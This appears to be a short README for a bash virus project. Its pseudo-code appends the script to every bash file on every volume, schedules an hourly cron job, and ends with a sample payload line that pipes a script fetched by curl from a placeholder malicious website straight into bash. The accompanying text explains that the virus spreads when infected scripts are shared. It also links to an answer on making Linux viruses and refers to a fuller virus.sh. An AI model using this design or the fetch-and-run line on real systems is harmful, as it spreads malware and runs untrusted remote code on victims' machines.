### Over simplified Psuedo-code
```
for $volume in '/volumes':
  for $bashFile in $volume.getAllBashFiles():
    $bashFile.append(thisScript)
    
cronJob.add(thisScript, OneHour)

# Add malicious code below this
# example:
bash <(curl -s http://myMaliciouswebsite.com/notahackscript.sh)
```

This script appends itself to all bash-scripts in every volume. So whenever that bash script is run, our code is also run.
When the affected scripts are shared to other computers, our virus is spread.

https://www.quora.com/How-can-I-make-a-virus-from-Linux/answer/Aravind-Reddy-V

A more tedious psuedo-code in `virus.sh` file.
